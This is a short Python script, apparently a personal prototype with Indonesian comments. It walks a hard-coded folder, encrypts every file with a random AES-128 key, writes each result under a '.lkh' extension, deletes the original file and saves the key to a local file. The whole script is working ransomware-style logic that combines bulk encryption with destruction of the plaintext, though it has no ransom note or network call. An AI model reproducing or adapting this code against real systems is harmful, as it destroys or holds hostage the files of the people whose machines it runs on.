import pickle
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
import os

def delete_file(file_path):
    try:
        os.remove(file_path)
    except OSError as e:
        print("Error:", e)

def save_byte_object(byte_object, file_path):
    with open(file_path, 'wb') as file:
        pickle.dump(byte_object, file)

def encrypt_file(file_path, key):
    with open(file_path, 'rb') as file:
        data = file.read()
    
    cipher = AES.new(key, AES.MODE_EAX)
    ciphertext, tag = cipher.encrypt_and_digest(data)
    
    encrypted_file_path = file_path + ".lkh"
    with open(encrypted_file_path, 'wb') as encrypted_file:
        encrypted_file.write(cipher.nonce + tag + ciphertext)
    
    print("File berhasil dienkripsi:", encrypted_file_path)

key = get_random_bytes(16)  # 16 byte key untuk AES-128
byte_object = key

key_path = f'key.ssg'
save_byte_object(byte_object, key_path)

for root, dirs, files in os.walk("C:/Users/Lenovo/Desktop/python/Chess"):
    for file in files:
        file_path = os.path.join(root, file)
        # Mengganti '\' dengan '/'
        file_path = file_path.replace('\\', '/')

        encrypt_file(file_path, key)
        delete_file(file_path)

        